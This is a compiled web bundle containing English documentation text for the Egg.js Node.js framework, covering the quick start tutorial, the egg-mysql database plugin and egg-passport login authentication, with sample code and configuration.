a busineess logic layer instead, i.e., `,paraId:52,tocIndex:7},{value:"service",paraId:53,tocIndex:7},{value:".",paraId:52,tocIndex:7},{value:`Let's create a service to fetch data from the
`,paraId:54,tocIndex:7},{value:"HackerNews",paraId:54,tocIndex:7},{value:".",paraId:54,tocIndex:7},{value:`// app/service/news.js
const Service = require('egg').Service;

class NewsService extends Service {
  async list(page = 1) {
    // read config
    const { serverUrl, pageSize } = this.config.news;

    // use build-in http client to GET hacker-news api
    const { data: idList } = await this.ctx.curl(
      \`\${serverUrl}/topstories.json\`,
      {
        data: {
          orderBy: '"$key"',
          startAt: \`"\${pageSize * (page - 1)}"\`,
          endAt: \`"\${pageSize * page - 1}"\`,
        },
        dataType: 'json',
      },
    );

    // parallel GET detail
    const newsList = await Promise.all(
      Object.keys(idList).map(async (key) => {
        const url = \`\${serverUrl}/item/\${idList[key]}.json\`;
        return await this.ctx.curl(url, { dataType: 'json' });
      }),
    );
    return newsList.map((res) => res.data);
  }
}

module.exports = NewsService;
`,paraId:55,tocIndex:7},{value:"Egg has ",paraId:56,tocIndex:7},{value:"HttpClient",paraId:57,tocIndex:7},{value:" built in in order to help you make HTTP requests.",paraId:56,tocIndex:7},{value:"Then slightly modify our previous controller.",paraId:58,tocIndex:7},{value:`// app/controller/news.js
const Controller = require('egg').Controller;

class NewsController extends Controller {
  async list() {
    const ctx = this.ctx;
    const page = ctx.query.page || 1;
    const newsList = await ctx.service.news.list(page);
    await ctx.render('news/list.tpl', { list: newsList });
  }
}

module.exports = NewsController;
`,paraId:59,tocIndex:7},{value:"And also add config.",paraId:60,tocIndex:7},{value:`// config/config.default.js
// add news' configurations
exports.news = {
  pageSize: 5,
  serverUrl: 'https://hacker-news.firebaseio.com/v0',
};
`,paraId:61,tocIndex:7},{value:`We might encounter a small problem here.
The time that we fetched are Unix Time format,
whereas we want to present them in a more friendly way to read.`,paraId:62,tocIndex:8},{value:`Egg provides us with a quick way to extend its functionalities.
We just need to add extension scripts to the `,paraId:63,tocIndex:8},{value:"app/extend",paraId:63,tocIndex:8},{value:` directory.
For more information, cf. `,paraId:63,tocIndex:8},{value:"Extensions",paraId:64,tocIndex:8},{value:".",paraId:63,tocIndex:8},{value:"In the case of view, we can just write a helper as an extension.",paraId:65,tocIndex:8},{value:`$ npm i moment --save
`,paraId:66,tocIndex:8},{value:`// app/extend/helper.js
const moment = require('moment');
exports.relativeTime = (time) => moment(new Date(time * 1000)).fromNow();
`,paraId:67,tocIndex:8},{value:"Then use it in the templates.",paraId:68,tocIndex:8},{value:`<!-- app/view/news/list.tpl -->
{{ helper.relativeTime(item.time) }}
`,paraId:69,tocIndex:8},{value:"Suppose that we wanted to prohibit accesses from Baidu crawlers.",paraId:70,tocIndex:9},{value:"Smart developers might quickly guess that we can achieve it by adding a ",paraId:71,tocIndex:9},{value:"middleware",paraId:72,tocIndex:9},{value:`
that checks the User-Agent.`,paraId:71,tocIndex:9},{value:`// app/middleware/robot.js
// options === app.config.robot
module.exports = (options, app) => {
  return async function robotMiddleware(ctx, next) {
    const source = ctx.get('user-agent') || '';
    const match = options.ua.some((ua) => ua.test(source));
    if (match) {
      ctx.status = 403;
      ctx.message = 'Go away, robot.';
    } else {
      await next();
    }
  };
};

// config/config.default.js
// add middleware robot
exports.middleware = ['robot'];
// robot's configurations
exports.robot = {
  ua: [/Baiduspider/i],
};
`,paraId:73,tocIndex:9},{value:"Now try it using ",paraId:74,tocIndex:9},{value:'curl localhost:7001/news -A "Baiduspider"',paraId:74,tocIndex:9},{value:".",paraId:74,tocIndex:9},{value:"See ",paraId:75,tocIndex:9},{value:"Middleware",paraId:76,tocIndex:9},{value:" for more details.",paraId:75,tocIndex:9},{value:`When writing business logic,
it is inevitable that we need to manage configurations.
Egg provides a powerful way to manage them in a merged configuration file.`,paraId:77,tocIndex:10},{value:"Environment-specific configuration files are well supported, e.g. config.local.js, config.prod.js, etc.",paraId:78,tocIndex:10},{value:"Configurations could be set wherever convenient for Applications/Plugins/Frameworks, and Egg will be careful to merge and load them.",paraId:78,tocIndex:10},{value:"For more information on merging, see ",paraId:78,tocIndex:10},{value:"Configurations",paraId:79,tocIndex:10},{value:".",paraId:78,tocIndex:10},{value:`// config/config.default.js
exports.robot = {
  ua: [/curl/i, /Baiduspider/i],
};

// config/config.local.js
// only read at development mode, will override default
exports.robot = {
  ua: [/Baiduspider/i],
};

// app/service/some.js
const Service = require('egg').Service;

class SomeService extends Service {
  async list() {
    const rule = this.config.robot.ua;
  }
}

module.exports = SomeService;
`,paraId:80,tocIndex:10},{value:"Unit Testing is very important, and Egg also provides ",paraId:81,tocIndex:11},{value:"egg-bin",paraId:81,tocIndex:11},{value:" to help you write tests painless.",paraId:81,tocIndex:11},{value:"All the test files should be placed at ",paraId:82,tocIndex:11},{value:"{app_root}/test/**/*.test.js",paraId:82,tocIndex:11},{value:".",paraId:82,tocIndex:11},{value:`// test/app/middleware/robot.test.js
const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/app/middleware/robot.test.js', () => {
  it('should block robot', () => {
    return app
      .httpRequest()
      .get('/')
      .set('User-Agent', 'Baiduspider')
      .expect(403);
  });
});
`,paraId:83,tocIndex:11},{value:"Then add ",paraId:84,tocIndex:11},{value:"npm scripts",paraId:84,tocIndex:11},{value:".",paraId:84,tocIndex:11},{value:`{
  "scripts": {
    "test": "egg-bin test",
    "cov": "egg-bin cov"
  }
}
`,paraId:85,tocIndex:11},{value:"Also install dependencies.",paraId:86,tocIndex:11},{value:`$ npm i egg-mock --save-dev
`,paraId:87,tocIndex:11},{value:"Run it.",paraId:88,tocIndex:11},{value:`$ npm test
`,paraId:89,tocIndex:11},{value:"That is all of it, for more detail, see ",paraId:90,tocIndex:11},{value:"Unit Testing",paraId:91,tocIndex:11},{value:".",paraId:90,tocIndex:11},{value:`We can only touch the tip of the iceberg of Egg with the above short sections.
Where to go from here? read our documentation to better understand the framework.`,paraId:92,tocIndex:12},{value:"About Egg boilerplate type, See ",paraId:93,tocIndex:12},{value:"Boilerplate Type Description",paraId:94,tocIndex:12},{value:".",paraId:93,tocIndex:12},{value:"Egg provides a powerful mechanism for extending features. See ",paraId:93,tocIndex:12},{value:"Plugin",paraId:95,tocIndex:12},{value:".",paraId:93,tocIndex:12},{value:"Egg framework allows small or large teams to work together as fast as possible under the well-documented conventions and coding best practices. In addition, the teams can build up logics on top of the framework to better suit their special needs. See more on [Frameworks].(../advanced/framework.md).",paraId:93,tocIndex:12},{value:"Egg framework provides code reusabilities and modularities. See details at ",paraId:93,tocIndex:12},{value:"Progressive",paraId:96,tocIndex:12},{value:".",paraId:93,tocIndex:12},{value:"Egg framework enables developers to write painless unit testing with many plugins and community-powered toolings. The team should give it a try by using Egg unit testing without worrying about setting up the testing tooling but writing the testing logics. See ",paraId:93,tocIndex:12},{value:"Unit Testing",paraId:97,tocIndex:12},{value:".",paraId:93,tocIndex:12}]},92301:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(56581);const t=[{value:"this document is still waiting for translation, see ",paraId:0},{value:"Chinese Version",paraId:1}]},10553:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(27753);const t=[{value:"Quick Start",paraId:0},{value:"Progressive Development",paraId:1},{value:"RESTful API",paraId:2},{value:"You can use boilerplate type like this:",paraId:3,tocIndex:0},{value:`$ npm init egg --type=simple
`,paraId:4,tocIndex:0},{value:"boilerplate type",paraId:5,tocIndex:1},{value:"Description",paraId:5,tocIndex:1},{value:"simple",paraId:5,tocIndex:1},{value:"Simple egg app boilerplate",paraId:5,tocIndex:1},{value:"empty",paraId:5,tocIndex:1},{value:"Empty egg app boilerplate",paraId:5,tocIndex:1},{value:"plugin",paraId:5,tocIndex:1},{value:"egg plugin boilerplate",paraId:5,tocIndex:1},{value:"framework",paraId:5,tocIndex:1},{value:"egg framework boilerplate",paraId:5,tocIndex:1},{value:"Build in ",paraId:6,tocIndex:2},{value:"egg-view",paraId:6,tocIndex:2},{value:" as template engine solution and support multiple render, which is called by plugin but keeping the consistent render API. Refer to ",paraId:6,tocIndex:2},{value:"how to use templates",paraId:7,tocIndex:2},{value:"\uFF0CMore details on ",paraId:6,tocIndex:2},{value:"template plugin development",paraId:8,tocIndex:2},{value:".",paraId:6,tocIndex:2},{value:"Template engines available as shown below. For more template engines ",paraId:9,tocIndex:2},{value:"searching",paraId:9,tocIndex:2},{value:"egg-view-nunjucks",paraId:10,tocIndex:2},{value:"egg-view-ejs",paraId:10,tocIndex:2},{value:"egg-view-handlebars",paraId:10,tocIndex:2},{value:"egg-view-pug",paraId:10,tocIndex:2},{value:"egg-view-xtpl",paraId:10,tocIndex:2},{value:"Official maintained ORM model is ",paraId:11,tocIndex:3},{value:"egg-orm",paraId:11,tocIndex:3},{value:" base on ",paraId:11,tocIndex:3},{value:"Leoric",paraId:11,tocIndex:3},{value:", and the following database plugins are currently available:",paraId:11,tocIndex:3},{value:"egg-orm",paraId:12,tocIndex:3},{value:"egg-sequelize",paraId:12,tocIndex:3},{value:"egg-mongoose",paraId:12,tocIndex:3},{value:"egg-mysql",paraId:12,tocIndex:3},{value:"\uFF0Crefer to ",paraId:12,tocIndex:3},{value:"MySQL tutorials",paraId:13,tocIndex:3},{value:"[egg-graphql]",paraId:12,tocIndex:3}]},21171:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(54851);const t=[{value:"MySQL is one of the most common and best RDBMS in terms of web applications. It is used in many large-scale websites such as Google and Facebook.",paraId:0},{value:"egg-mysql",paraId:1},{value:"egg-mysql",paraId:2,tocIndex:0},{value:" is provided to access both the MySQL databases and MySQL-based online database service.",paraId:2,tocIndex:0},{value:"Install ",paraId:3,tocIndex:1},{value:"egg-mysql",paraId:3,tocIndex:1},{value:`$ npm i --save egg-mysql
`,paraId:4,tocIndex:1},{value:"Enable Plugin:",paraId:5,tocIndex:1},{value:`// config/plugin.js
exports.mysql = {
  enable: true,
  package: 'egg-mysql',
};
`,paraId:6,tocIndex:1},{value:"Configure database information in ",paraId:7,tocIndex:1},{value:"config/config.${env}.js",paraId:7,tocIndex:1},{value:"Configuration to accesss single MySQL instance as shown below:",paraId:8,tocIndex:2},{value:`// config/config.\${env}.js
exports.mysql = {
  // database configuration
  client: {
    host: 'mysql.com',
    port: '3306',
    user: 'test_user',
    password: 'test_password',
    database: 'test',
  },
  // load into app, default true
  app: true,
  // load into agent, default false
  agent: false,
};
`,paraId:9,tocIndex:2},{value:"Use:",paraId:10,tocIndex:2},{value:`await app.mysql.query(sql, values); // single instance can be accessed through app.mysql
`,paraId:11,tocIndex:2},{value:"Configuration to accesss multiple MySQL instances as below:",paraId:12,tocIndex:3},{value:`exports.mysql = {
  clients: {
    // clientId, obtain the client instances using the app.mysql.get('clientId')
    db1: {
      host: 'mysql.com',
      port: '3306',
      user: 'test_user',
      password: 'test_password',
      database: 'test',
    },
    db2: {
      host: 'mysql2.com',
      port: '3307',
      user: 'test_user',
      password: 'test_password',
      database: 'test',
    },
    // ...
  },
  //default configuration of all databases
  default: {},

  // load into app, default true
  app: true,
  // load into agent, default false
  agent: false,
};
`,paraId:13,tocIndex:3},{value:"Use:",paraId:14,tocIndex:3},{value:`const client1 = app.mysql.get('db1');
await client1.query(sql, values);

const client2 = app.mysql.get('db2');
await client2.query(sql, values);
`,paraId:15,tocIndex:3},{value:"Pre-declaration of configuration might not needed in the configuration file. Obtaining the actual parameters dynamically from the configuration center then initialize an instance instead.",paraId:16,tocIndex:4},{value:`// {app_root}/app.js
module.exports = (app) => {
  app.beforeStart(async () => {
    // obtain the MySQL configuration from the configuration center
    // { host: 'mysql.com', port: '3306', user: 'test_user', password: 'test_password', database: 'test' }
    const mysqlConfig = await app.configCenter.fetch('mysql');
    app.database = app.mysql.createInstance(mysqlConfig);
  });
};
`,paraId:17,tocIndex:4},{value:"Connecting to MySQL is a data processing layer in the Web layer. So it is strongly recommended that keeping the code in the Service layer.",paraId:18,tocIndex:5},{value:"An example of connecting to MySQL as follows.",paraId:19,tocIndex:5},{value:"Details of Service layer, refer to ",paraId:20,tocIndex:5},{value:"service",paraId:21,tocIndex:5},{value:`// app/service/user.js
class UserService extends Service {
  async find(uid) {
    // assume we have the user id then trying to get the user details from database
    const user = await this.app.mysql.get('users', { id: 11 });
    return { user };
  }
}
`,paraId:22,tocIndex:5},{value:"After that, obtaining the data from service layer using the controller",paraId:23,tocIndex:5},{value:`// app/controller/user.js
class UserController extends Controller {
  async info() {
    const ctx = this.ctx;
    const userId = ctx.params.id;
    const user = await ctx.service.user.find(userId);
    ctx.body = user;
  }
}
`,paraId:24,tocIndex:5},{value:"Following statments default under ",paraId:25,tocIndex:6},{value:"app/service",paraId:25,tocIndex:6},{value:" if not specifed",paraId:25,tocIndex:6},{value:"INSERT method to perform the INSERT INTO query",paraId:26,tocIndex:7},{value:`// INSERT
const result = await this.app.mysql.insert('posts', { title: 'Hello World' }); //insert a record title 'Hello World' to 'posts' table

=> INSERT INTO \`posts\`(\`title\`) VALUES('Hello World');

console.log(result);
=>
{
  fieldCount: 0,
  affectedRows: 1,
  insertId: 3710,
  serverStatus: 2,
  warningCount: 2,
  message: '',
  protocol41: true,
  changedRows: 0
}

// check if insertion is success or failure
const insertSuccess = result.affectedRows === 1;
`,paraId:27,tocIndex:7},{value:"Use ",paraId:28,tocIndex:8},{value:"get",paraId:28,tocIndex:8},{value:" or ",paraId:28,tocIndex:8},{value:"select",paraId:28,tocIndex:8},{value:" to select one or multiple records. ",paraId:28,tocIndex:8},{value:"select",paraId:28,tocIndex:8},{value:` method support query criteria and result customization.
Use `,paraId:28,tocIndex:8},{value:"count",paraId:28,tocIndex:8},{value:" method to count all rows of the query result",paraId:28,tocIndex:8},{value:"get one record",paraId:29,tocIndex:8},{value:"const post = await this.app.mysql.get('posts', { id: 12 });\n\n=> SELECT * FROM `posts` WHERE `id` = 12 LIMIT 0, 1;\n",paraId:30,tocIndex:8},{value:"query all from the table",paraId:31,tocIndex:8},{value:`const results = await this.app.mysql.select('posts');

=> SELECT * FROM \`posts\`;
`,paraId:32,tocIndex:8},{value:"query criteria and result customization",paraId:33,tocIndex:8},{value:"const results = await this.app.mysql.select('posts', { // search posts table\n  where: { status: 'draft', author: ['author1', 'author2'] }, // WHERE criteria\n  columns: ['author', 'title'], // get the value of certain columns\n  orders: [['created_at','desc'], ['id','desc']], // sort order\n  limit: 10, // limit the return rows\n  offset: 0, // data offset\n});\n\n=> SELECT `author`, `title` FROM `posts`\n  WHERE `status` = 'draft' AND `author` IN('author1','author2')\n  ORDER BY `created_at` DESC, `id` DESC LIMIT 0, 10;\n",paraId:34,tocIndex:8},{value:"count the number of rows in the query result",paraId:35,tocIndex:8},{value:"const total = await this.app.mysql.count('posts', { status: 'published' }); // count the number of result rows in the posts table whose status is published\n\n=> SELECT COUNT(*) FROM `posts` WHERE `status` = 'published'\n",paraId:36,tocIndex:8},{value:"UPDATE operation to update the records of databases",paraId:37,tocIndex:9},{value:`// modify data and search by primary key ID, and refresh
const row = {
  id: 123,
  name: 'fengmk2',
  otherField: 'other field value',    // any other fields u want to update
  modifiedAt: this.app.mysql.literals.now, // \`now()\` on db server
};
const result = await this.app.mysql.update('posts', row); // update records in 'posts'

=> UPDATE \`posts\` SET \`name\` = 'fengmk2', \`modifiedAt\` = NOW() WHERE id = 123 ;

// check if update is success or failure
const updateSuccess = result.affectedRows === 1;

// if primary key is your custom id,such as custom_id,you should config it in \`where\`
const row = {
  name: 'fengmk2',
  otherField: 'other field value',    // any other fields u want to update
  modifiedAt: this.app.mysql.literals.now, // \`now()\` on db server
};

const options = {
  where: {
    custom_id: 456
  }
};
const result = await this.app.mysql.update('posts', row, options); // update records in 'posts'

=> UPDATE \`posts\` SET \`name\` = 'fengmk2', \`modifiedAt\` = NOW() WHERE custom_id = 456 ;

// check if update is success or failure
const updateSuccess = result.affectedRows === 1;
`,paraId:38,tocIndex:9},{value:"DELETE operation to delete the records of databases",paraId:39,tocIndex:10},{value:`const result = await this.app.mysql.delete('posts', {
  author: 'fengmk2',
});

=> DELETE FROM \`posts\` WHERE \`author\` = 'fengmk2';
`,paraId:40,tocIndex:10},{value:"Plugin supports splicing and execute SQL statment directly. It can use ",paraId:41,tocIndex:11},{value:"query",paraId:41,tocIndex:11},{value:" to execute a valid SQL statement",paraId:41,tocIndex:11},{value:"Note!! Strongly do not recommend developers splicing SQL statement, it is easier to cause SQL injection!!",paraId:42,tocIndex:11},{value:"Use the ",paraId:43,tocIndex:11},{value:"mysql.escape",paraId:43,tocIndex:11},{value:" method if you have to splice SQL statement",paraId:43,tocIndex:11},{value:"Refer to ",paraId:44,tocIndex:11},{value:"preventing-sql-injection-in-node-js",paraId:44,tocIndex:11},{value:`const postId = 1;
const results = await this.app.mysql.query('update posts set hits = (hits + ?) where id = ?', [1, postId]);

=> update posts set hits = (hits + 1) where id = 1;
`,paraId:45,tocIndex:11},{value:`Transaction is mainly used to deal with large data of high complexity. For example, in a personnel management system, deleting a person which need to delete the basic information of the staff, but also need to delete the related information of staff, such as mailboxes, articles and so on. It is easier to use transaction to run a set of operations.
A transaction is a set of continuous database operations which performed as a single unit of work. Each individual operation within the group is successful and the transaction succeeds. If one part of the transaction fails, then the entire transaction fails.
In gerenal, transaction must be atomic, consistent, isolated and durable.`,paraId:46,tocIndex:12},{value:'Atomicity requires that each transaction be "all or nothing": if one part of the transaction fails, then the entire transaction fails, and the database state is left unchanged.',paraId:47,tocIndex:12},{value:"The consistency property ensures that any transaction will bring the database from one valid state to another.",paraId:47,tocIndex:12},{value:"The isolation property ensures that the concurrent execution of transactions results in a system state that would be obtained if transactions were executed sequentially",paraId:47,tocIndex:12},{value:"The durability property ensures that once a transaction has been committed, it will remain so.",paraId:47,tocIndex:12},{value:"Therefore, for a transaction, must be accompanied by beginTransaction, commit or rollback, respectively, beginning of the transaction, success and failure to roll back.",paraId:48,tocIndex:12},{value:"egg-mysql proviodes two types of transactions",paraId:49,tocIndex:12},{value:"adventage: ",paraId:50,tocIndex:13},{value:"beginTransaction",paraId:50,tocIndex:13},{value:", ",paraId:50,tocIndex:13},{value:"commit",paraId:50,tocIndex:13},{value:" or ",paraId:50,tocIndex:13},{value:"rollback",paraId:50,tocIndex:13},{value:" can be completely under control by developer",paraId:50,tocIndex:13},{value:"disadventage: more handwritten code, Forgot catching error or cleanup will lead to serious bug.",paraId:50,tocIndex:13},{value:`const conn = await app.mysql.beginTransaction(); // initialize the transaction

try {
  await conn.insert(table, row1); // first step
  await conn.update(table, row2); // second step
  await conn.commit(); // commit the transaction
} catch (err) {
  // error, rollback
  await conn.rollback(); // rollback after catching the exception!!
  throw err;
}
`,paraId:51,tocIndex:13},{value:"API\uFF1A",paraId:52,tocIndex:14},{value:"beginTransactionScope(scope, ctx)",paraId:52,tocIndex:14},{value:"scope",paraId:53,tocIndex:14},{value:": A generatorFunction which will execute all sqls of this transaction.",paraId:53,tocIndex:14},{value:"ctx",paraId:53,tocIndex:14},{value:": The context object of current request, it will ensures that even in the case of a nested transaction, there is only one active transaction in a request at the same time.",paraId:53,tocIndex:14},{value:"adventage: easy to use, as if there is no transaction in your code.",paraId:52,tocIndex:14},{value:"disadvantage: all transation will be successful or failed, cannot control precisely",paraId:52,tocIndex:14},{value:`const result = await app.mysql.beginTransactionScope(async (conn) => {
  // don't commit or rollback by yourself
  await conn.insert(table, row1);
  await conn.update(table, row2);
  return { success: true };
}, ctx); // ctx is the context of current request, accessed by \`this.ctx\`  within in service file.
// if error throw on scope, will auto rollback
`,paraId:54,tocIndex:14},{value:"Use ",paraId:55,tocIndex:15},{value:"Literal",paraId:55,tocIndex:15},{value:" if need to call literals or functions in MySQL",paraId:55,tocIndex:15},{value:"NOW()",paraId:56,tocIndex:16},{value:"\uFF1AThe database system time, obtained by ",paraId:56,tocIndex:16},{value:"app.mysql.literals.now",paraId:56,tocIndex:16},{value:`await this.app.mysql.insert(table, {
  create_time: this.app.mysql.literals.now,
});

=> INSERT INTO \`$table\`(\`create_time\`) VALUES(NOW())
`,paraId:57,tocIndex:16},{value:"The following demo showe how to call ",paraId:58,tocIndex:17},{value:"CONCAT(s1, ...sn)",paraId:58,tocIndex:17},{value:" funtion in mysql to do string splicing.",paraId:58,tocIndex:17},{value:`const Literal = this.app.mysql.literals.Literal;
const first = 'James';
const last = 'Bond';
await this.app.mysql.insert(table, {
  id: 123,
  fullname: new Literal(\`CONCAT("\${first}", "\${last}"\`),
});

=> INSERT INTO \`$table\`(\`id\`, \`fullname\`) VALUES(123, CONCAT("James", "Bond"))
`,paraId:59,tocIndex:17}]},48515:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(72629);const t=[{value:"Login authentication",paraId:0},{value:' is a common business scenario, including "account password login" and "third-party unified login".',paraId:0},{value:"Among them, we often use the latter, such as Google, GitHub, QQ unified login, which are based on ",paraId:1},{value:"OAuth",paraId:1},{value:" specification.",paraId:1},{value:"Passport",paraId:2},{value:" is a highly scalable authentication middleware that supports the ",paraId:2},{value:"Strategy",paraId:2},{value:" of ",paraId:2},{value:"Github",paraId:2},{value:" ,",paraId:2},{value:"Twitter",paraId:2},{value:",",paraId:2},{value:"Facebook",paraId:2},{value:", and other well-known service vendors. It also supports login authorization verification via account passwords.",paraId:2},{value:"Egg provides an ",paraId:3},{value:"egg-passport",paraId:3},{value:" plugin which encapsulates general logic such as callback processing after initialization and the success of authentication so that the developers can use Passport with just a few API calls.",paraId:3},{value:"The execution sequence of ",paraId:4},{value:"Passport",paraId:4},{value:" is as follows:",paraId:4},{value:"User accesses page",paraId:5},{value:"Check Session",paraId:5},{value:"Intercept and jump to authentication login page",paraId:5},{value:"Strategy Authentication",paraId:5},{value:"Check and store user information",paraId:5},{value:"Serialize user information to Session",paraId:5},{value:"Jump to the specified page",paraId:5},{value:"egg-passport",paraId:6},{value:"Below, we will use GitHub login as an example to demonstrate how to use it.",paraId:7,tocIndex:0},{value:`$ npm i --save egg-passport
$ npm i --save egg-passport-github
`,paraId:8,tocIndex:1},{value:"For more plugins, see ",paraId:9,tocIndex:1},{value:"GitHub Topic - egg-passport",paraId:9,tocIndex:1},{value:" .",paraId:9,tocIndex:1},{value:"Enabling the plugin:",paraId:10,tocIndex:2},{value:`// config/plugin.js
module.exports.passport = {
  enable: true,
  package: 'egg-passport',
};

module.exports.passportGithub = {
  enable: true,
  package: 'egg-passport-github',
};
`,paraId:11,tocIndex:2},{value:"Configuration:",paraId:12,tocIndex:2},{value:"Note: The ",paraId:13,tocIndex:2},{value:"egg-passport",paraId:13,tocIndex:2},{value:" standardizes the configuration fields, which are unified as ",paraId:13,tocIndex:2},{value:"key",paraId:13,tocIndex:2},{value:" and ",paraId:13,tocIndex:2},{value:"secret",paraId:13,tocIndex:2},{value:".",paraId:13,tocIndex:2},{value:`// config/default.js
config.passportGithub = {
  key: 'your_clientID',
  secret: 'your_clientSecret',
};
`,paraId:14,tocIndex:2},{value:"Note:",paraId:15,tocIndex:2},{value:"Create a ",paraId:16,tocIndex:2},{value:"GitHub OAuth Apps",paraId:16,tocIndex:2},{value:" to get the ",paraId:16,tocIndex:2},{value:"clientID",paraId:16,tocIndex:2},{value:" and ",paraId:16,tocIndex:2},{value:"clientSecret",paraId:16,tocIndex:2},{value:" information.",paraId:16,tocIndex:2},{value:"Specify a ",paraId:16,tocIndex:2},{value:"callbackURL",paraId:16,tocIndex:2},{value:", such as ",paraId:16,tocIndex:2},{value:"http://127.0.0.1:7001/passport/github/callback",paraId:16,tocIndex:2},{value:`
\xA0\xA0- You need to update to the corresponding domain name when deploying online
\xA0\xA0- The path is configured via `,paraId:16,tocIndex:2},{value:"options.callbackURL",paraId:16,tocIndex:2},{value:", which defaults to ",paraId:16,tocIndex:2},{value:"/passport/${strategy}/callback",paraId:16,tocIndex:2},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app; // Mount the authentication route

  app.passport.mount('github'); // The mount above is syntactic sugar, which is equivalent to // const github = app.passport.authenticate('github', {}); // router.get('/passport/github', github); // router.get('/passport/github/callback', github);
};
`,paraId:17,tocIndex:3},{value:"Then we also need:",paraId:18,tocIndex:4},{value:"When signing in for the first time, you generally need to put user information into the repository and record the Session.",paraId:19,tocIndex:4},{value:"In the second login, the user information obtained from OAuth or Session, and the database is read to get the complete user information.",paraId:19,tocIndex:4},{value:`// app.js
module.exports = (app) => {
  app.passport.verify(async (ctx, user) => {
    // Check user
    assert(user.provider, 'user.provider should exists');
    assert(user.id, 'user.id should exists'); // Find user information from the database // // Authorization Table // column   | desc // ---      | -- // provider | provider name, like github, twitter, facebook, weibo and so on // uid      | provider unique id // user_id  | current application user id

    const auth = await ctx.model.Authorization.findOne({
      uid: user.id,
      provider: user.provider,
    });
    const existsUser = await ctx.model.User.findOne({ id: auth.user_id });
    if (existsUser) {
      return existsUser;
    } // Call service to register a new user
    const newUser = await ctx.service.user.register(user);
    return newUser;
  }); // Serialize and store the user information into session. Generally, only a few fields need to be streamlined/saved.

  app.passport.serializeUser(async (ctx, user) => {
    // process user
    // ...
    // return user;
  }); // Deserialize the user information from the session, check the database to get the complete information

  app.passport.deserializeUser(async (ctx, user) => {
    // process user
    // ...
    // return user;
  });
};
`,paraId:20,tocIndex:4},{value:"At this point, we have completed all the configurations. For a complete example, see: ",paraId:21,tocIndex:4},{value:"eggjs/examples/passport",paraId:21,tocIndex:4},{value:"egg-passport",paraId:22,tocIndex:5},{value:" provides the following extensions:",paraId:22,tocIndex:5},{value:"ctx.user",paraId:23,tocIndex:5},{value:" - Get current logged in user information",paraId:23,tocIndex:5},{value:"ctx.isAuthenticated()",paraId:23,tocIndex:5},{value:" - Check if the request is authorized",paraId:23,tocIndex:5},{value:"ctx.login(user, [options])",paraId:23,tocIndex:5},{value:" - Start a login session for the user",paraId:23,tocIndex:5},{value:"ctx.logout()",paraId:23,tocIndex:5},{value:" - Exit and clear user information from session",paraId:23,tocIndex:5},{value:"ctx.session.returnTo=",paraId:23,tocIndex:5},{value:" - Set redirect address after authentication page success",paraId:23,tocIndex:5},{value:"The API also be provided for:",paraId:24,tocIndex:5},{value:"app.passport.verify(async (ctx, user) => {})",paraId:25,tocIndex:5},{value:" - Check user",paraId:25,tocIndex:5},{value:"app.passport.serializeUser(async (ctx, user) => {})",paraId:25,tocIndex:5},{value:" - Serialize user information into session",paraId:25,tocIndex:5},{value:"app.passport.deserializeUser(async (ctx, user) => {})",paraId:25,tocIndex:5},{value:" - Deserialize user information from the session",paraId:25,tocIndex:5},{value:"app.passport.authenticate(strategy, options)",paraId:25,tocIndex:5},{value:` - Generate the specified authentication middleware
\xA0\xA0- `,paraId:25,tocIndex:5},{value:"options.successRedirect",paraId:25,tocIndex:5},{value:` - specifies the redirect address after successful authentication
\xA0\xA0- `,paraId:25,tocIndex:5},{value:"options.loginURL",paraId:25,tocIndex:5},{value:" - jump login address, defaults to ",paraId:25,tocIndex:5},{value:"/passport/${strategy}",paraId:25,tocIndex:5},{value:`
\xA0\xA0- `,paraId:25,tocIndex:5},{value:"options.callbackURL",paraId:25,tocIndex:5},{value:" - callback address after authorization, defaults to ",paraId:25,tocIndex:5},{value:"/passport/${strategy}/callback",paraId:25,tocIndex:5},{value:"app.passport.mount(strategy, options)",paraId:25,tocIndex:5},{value:" - Syntactic sugar for developers to configure routing",paraId:25,tocIndex:5},{value:"Note:",paraId:26,tocIndex:5},{value:"app.passport.authenticate",paraId:27,tocIndex:5},{value:", if ",paraId:27,tocIndex:5},{value:"options.successRedirect",paraId:27,tocIndex:5},{value:" or ",paraId:27,tocIndex:5},{value:"options.successReturnToOrRedirect",paraId:27,tocIndex:5},{value:" is null, it will redirect to ",paraId:27,tocIndex:5},{value:"/",paraId:27,tocIndex:5},{value:" by default",paraId:27,tocIndex:5},{value:"Passport",paraId:28,tocIndex:6},{value:` has many middleware and it is impossible to have the second encapsulation.
Next, let's look at how to use Passport middleware directly in the framework.
We will use `,paraId:28,tocIndex:6},{value:"passport-local",paraId:28,tocIndex:6},{value:' for "account password login" as an example:',paraId:28,tocIndex:6},{value:`$ npm i --save passport-local
`,paraId:29,tocIndex:7},{value:`// app.js
const LocalStrategy = require('passport-local').Strategy;

module.exports = (app) => {
  // Mount strategy
  app.passport.use(
    new LocalStrategy(
      {
        passReqToCallback: true,
      },
      (req, username, password, done) => {
        // format user
        const user = {
          provider: 'local',
          username,
          password,
        };
        debug('%s %s get user: %j', req.method, req.url, user);
        app.passport.doVerify(req, user, done);
      },
    ),
  ); // Process user information

  app.passport.verify(async (ctx, user) => {});
  app.passport.serializeUser(async (ctx, user) => {});
  app.passport.deserializeUser(async (ctx, user) => {});
};
`,paraId:30,tocIndex:8},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.get('/', controller.home.index); // Callback page after successful authentication

  router.get('/authCallback', controller.home.authCallback); // Render login page, user inputs account password

  router.get('/login', controller.home.login); // Login verification
  router.post(
    '/login',
    app.passport.authenticate('local', { successRedirect: '/authCallback' }),
  );
};
`,paraId:31,tocIndex:9},{value:"In the previous section, we learned how to use a Passport middleware in the framework. We can further encapsulate it as a plugin and give back to the community.",paraId:32,tocIndex:10},{value:"initialization:",paraId:33,tocIndex:10},{value:`$ npm init egg --type=plugin egg-passport-local
`,paraId:34,tocIndex:10},{value:"Configure dependencies in ",paraId:35,tocIndex:10},{value:"package.json",paraId:35,tocIndex:10},{value:":",paraId:35,tocIndex:10},{value:`{
  "name": "egg-passport-local",
  "version": "1.0.0",
  "eggPlugin": {
    "name": "passportLocal",
    "dependencies": ["passport"]
  },
  "dependencies": {
    "passport-local": "^1.0.0"
  }
}
